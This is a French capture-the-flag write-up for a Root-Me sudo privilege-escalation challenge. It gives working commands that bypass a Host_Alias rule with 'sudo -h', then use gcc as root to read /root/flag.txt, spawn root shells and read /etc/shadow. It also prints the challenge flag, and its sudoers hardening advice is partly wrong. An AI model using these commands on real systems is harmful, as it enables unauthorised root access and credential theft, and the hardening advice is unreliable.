# Linux Privesc - CVE (Root-Me Challenge)

## Informations de connexion

```
Host: sockets.challenges.root-me.pro
Port: 32630
Utilisateur: user
Mot de passe: password
```

### Commande de connexion SSH

```bash
ssh user@sockets.challenges.root-me.pro -p 32630
```

---

## Objectif

Le SOC a confirmé une faille de sécurité critique sur les serveurs de production. Exploiter la vulnérabilité via le fichier `/etc/sudoers` pour lire `/root/flag.txt`.

---

## Reconnaissance

### Version de sudo

```bash
user@rmp:~$ sudo --version
Sudo version 1.9.16p1
Sudoers policy plugin version 1.9.16p1
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.16p1
Sudoers audit plugin version 1.9.16p1
```

### Hostname actuel

```bash
user@rmp:~$ hostname
rmp
```

### Configuration sudoers

```bash
user@rmp:~$ cat /etc/sudoers
Defaults lecture = never

root ALL=(ALL:ALL) ALL
%sudo   ALL=(ALL:ALL) ALL

Host_Alias PROD = rmp
Host_Alias PREPROD = preprod-rmp

user PREPROD=(root:root) NOPASSWD:/usr/bin/gcc

@includedir /etc/sudoers.d
```

### Analyse de la configuration

```
Host_Alias PROD = rmp           ← Serveur de production (notre machine)
Host_Alias PREPROD = preprod-rmp ← Serveur de pré-production

user PREPROD=(root:root) NOPASSWD:/usr/bin/gcc
│    │       │           │        └── Commande autorisée
│    │       │           └── Sans mot de passe
│    │       └── En tant que root:root
│    └── Uniquement sur l'hôte PREPROD
└── Utilisateur concerné
```

**Problème apparent :** Nous sommes sur `rmp` (PROD) mais la règle est pour `PREPROD`. Normalement, nous ne devrions pas pouvoir exécuter cette commande.

---

## Vulnérabilité

### CVE : Bypass Host_Alias avec l'option `-h`

L'option `-h` (ou `--host`) de sudo permet de spécifier un hostname différent pour la vérification des règles sudoers. Cette fonctionnalité peut être exploitée pour contourner les restrictions basées sur les Host_Alias.

### Test du bypass

```bash
# Sans l'option -h : ÉCHEC
user@rmp:~$ sudo /usr/bin/gcc --version
[sudo] password for user:
Sorry, user user is not allowed to execute '/usr/bin/gcc --version' as root on rmp.

# Avec l'option -h : SUCCÈS
user@rmp:~$ sudo -h preprod-rmp /usr/bin/gcc --version
gcc (Debian 12.2.0-14) 12.2.0
```

---

## Exploitation

### Concept

Une fois qu'on peut exécuter `gcc` en tant que root, on peut l'utiliser pour lire des fichiers arbitraires via le préprocesseur C avec la directive `#include`.

### Étape 1 : Créer un fichier C malveillant

```bash
user@rmp:~$ echo "#include </root/flag.txt>" > /tmp/exploit.c
```

### Étape 2 : Compiler avec gcc (en tant que root)

```bash
user@rmp:~$ sudo -h preprod-rmp /usr/bin/gcc /tmp/exploit.c 2>&1
In file included from /tmp/exploit.c:1:
/root/flag.txt:1:3: error: expected '=', ',', ';', 'asm' or '__attribute__' before '{' token
    1 | RM{aea2d3f16fae10330e002c4e3371974a}
      |   ^
```

Le préprocesseur gcc tente d'interpréter le contenu du flag comme du code C, et l'erreur de syntaxe révèle le contenu du fichier !

### Exploit en une ligne

```bash
echo "#include </root/flag.txt>" > /tmp/x.c && sudo -h preprod-rmp /usr/bin/gcc /tmp/x.c 2>&1
```

---

## Schéma de l'attaque

```
┌─────────────────────────────────────────────────────────────┐
│                    CONFIGURATION SUDOERS                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Host_Alias PROD = rmp          ← Nous sommes ici           │
│  Host_Alias PREPROD = preprod-rmp                           │
│                                                             │
│  user PREPROD=(root) NOPASSWD:/usr/bin/gcc                  │
│       └── Règle pour PREPROD uniquement                     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    BYPASS AVEC -h                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  sudo -h preprod-rmp /usr/bin/gcc ...                       │
│       └── Spoof du hostname pour matcher PREPROD            │
│                                                             │
│  Sudo vérifie: "Est-ce que 'preprod-rmp' matche PREPROD?"  │
│  Réponse: OUI → Commande autorisée!                         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    EXPLOITATION GCC                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Créer /tmp/exploit.c contenant:                         │
│     #include </root/flag.txt>                               │
│                                                             │
│  2. Compiler avec gcc (en root):                            │
│     sudo -h preprod-rmp /usr/bin/gcc /tmp/exploit.c         │
│                                                             │
│  3. Le préprocesseur lit /root/flag.txt                     │
│     et affiche son contenu dans l'erreur                    │
│                                                             │
│  Résultat: RM{aea2d3f16fae10330e002c4e3371974a}             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Flag

```
RM{aea2d3f16fae10330e002c4e3371974a}
```

---

## Alternatives d'exploitation avec GCC

### Méthode 1 : Shell interactif via wrapper

```bash
sudo -h preprod-rmp /usr/bin/gcc -wrapper /bin/sh,-s .
```

### Méthode 2 : Compiler un programme de lecture

```bash
cat > /tmp/readflag.c << 'EOF'
#include <stdio.h>
int main() {
    char buf[256];
    FILE *f = fopen("/root/flag.txt", "r");
    while(fgets(buf, sizeof(buf), f)) printf("%s", buf);
    return 0;
}
EOF

sudo -h preprod-rmp /usr/bin/gcc /tmp/readflag.c -o /tmp/readflag
/tmp/readflag
```

### Méthode 3 : Compiler un shell SUID

```bash
cat > /tmp/shell.c << 'EOF'
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
    return 0;
}
EOF

sudo -h preprod-rmp /usr/bin/gcc /tmp/shell.c -o /tmp/shell
sudo -h preprod-rmp chmod +s /tmp/shell
/tmp/shell
```

---

## Concepts de sécurité

### Options sudo dangereuses

| Option | Description | Risque |
|--------|-------------|--------|
| `-h HOST` | Spécifie un hostname | Bypass Host_Alias |
| `-u USER` | Spécifie un utilisateur | Bypass User_Alias |
| `-g GROUP` | Spécifie un groupe | Bypass Runas_Alias |

### Comment sécuriser sudoers

1. **Éviter les Host_Alias** si possible, ou désactiver l'option `-h` :
   ```
   Defaults!ALL !set_home, !set_env, !use_pty
   ```

2. **Restreindre les commandes** avec des chemins absolus et des arguments fixes :
   ```
   user ALL=(root) NOPASSWD:/usr/bin/specific_command specific_args
   ```

3. **Utiliser NOEXEC** pour empêcher l'exécution de sous-processus :
   ```
   user ALL=(root) NOEXEC:/usr/bin/gcc
   ```

4. **Auditer régulièrement** les fichiers sudoers

---

## GTFOBins - GCC

Référence : https://gtfobins.github.io/gtfobins/gcc/

```bash
# Shell via GCC
gcc -wrapper /bin/sh,-s .

# Lecture de fichier via préprocesseur
gcc -E -x c - <<< '#include "/etc/shadow"'

# Écriture de fichier
gcc -x c -o /tmp/output - <<< 'code...'
```

---

## Commandes utiles

```bash
# Vérifier la version de sudo
sudo --version

# Lister les permissions sudo
sudo -l

# Tester avec un hostname différent
sudo -h <hostname> <commande>

# Voir les options sudo
man sudo
man sudoers

# Rechercher des CVE sudo
searchsploit sudo
```

---

## Ressources

- [GTFOBins - GCC](https://gtfobins.github.io/gtfobins/gcc/)
- [Sudo Man Page](https://www.sudo.ws/man/sudo.man.html)
- [Sudoers Manual](https://www.sudo.ws/man/sudoers.man.html)
- `man 5 sudoers` - Format du fichier sudoers
